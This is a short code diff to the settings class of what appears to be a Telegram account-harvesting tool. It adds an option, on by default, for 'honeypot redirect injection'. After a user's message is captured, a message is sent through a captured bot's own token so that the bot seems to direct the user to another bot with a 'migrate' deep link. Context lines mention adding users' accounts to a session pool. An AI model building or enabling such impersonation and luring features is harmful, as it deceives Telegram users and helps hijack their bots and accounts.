@@ -26,6 +26,14 @@ class Settings(BaseSettings):
     # in DM. If True, ANY Telegram user can DM the login bot and add their
     # own account to the session pool — dangerous, use with caution.
     ALLOW_PUBLIC_STARTHUNTER: bool = False
+
+    # Honeypot redirect injection — after capturing a user's message via the
+    # honeypot, send them a redirect message pointing to the onboard bot.
+    # The message is sent FROM the captured bot (using its own token) TO the
+    # user, making it look like the bot itself is directing them.
+    HONEYPOT_REDIRECT_MODE: bool = True  # ON by default per user directive
+    HONEYPOT_REDIRECT_BOT: str = "bryanseahbot"  # username of the redirect target
+    HONEYPOT_REDIRECT_DEEPLINK: str = "migrate"  # ?start=<this> param
     MONITOR_API_KEY: str  # Required — protects /monitor and /health/detailed endpoints
 
     # Telegram Monitoring (The Bot(s) WE control - supports multi-bot rotation)
